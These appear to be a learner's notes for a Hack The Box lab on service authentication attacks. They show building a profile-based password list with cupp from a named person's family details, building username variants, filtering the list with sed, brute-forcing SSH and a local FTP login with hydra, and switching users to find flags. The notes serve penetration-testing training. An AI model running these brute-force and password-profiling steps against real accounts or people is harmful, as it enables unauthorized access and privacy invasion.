# 🪖 Service Authentication Attacks

## Personalized Wordlists

We are going tu use `cupp,`we can install it with `sudo apt install cupp` or clone it from the [Github repository](https://github.com/Mebus/cupp).

```shell-session
ElFelixi0@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955

> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964

> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996

> Pet's name: Nila
> Company name: Microsoft

> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
[+] Now load your pistolero with william.txt and shoot! Good luck!
```

If we were able to see the password policy we can go and make that list more accurate to our target ->

```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

To make permutations of each word in that list, we can use [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long.

### Custom Username Wordlist

To guess a person's username that could be `b.gates` or `gates` or `bill`, and many other potential variations we can use is [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

```shell-session
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Bill Gates > bill.txt
```

## Service Authentication Brute Forcing

### SSH Attack

`service://SERVER_IP:PORT` at the end. As usual, we will add the `-u -f` flags and `-t 4`

```shell-session
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

### FTP Brute Forcing

Once we're in, we check the users ->

```shell-session
ls /home
```

We check what is running in background and see port 21/FTP

```shell-session
b.gates@bruteforcing:~$ netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -                  
```

We can now try to bruteforce FTP for the other user:

```shell-session
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

and connect locally juste like this:

```shell-session
ftp 127.0.0.1
```

and after looking through everything we can juste switch user :

```shell-session
su - m.gates
```

_**Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?**_



_**Once you ssh in, try brute forcing the FTP login for the other user. You should find another flag in their home directory. What is the flag?**_

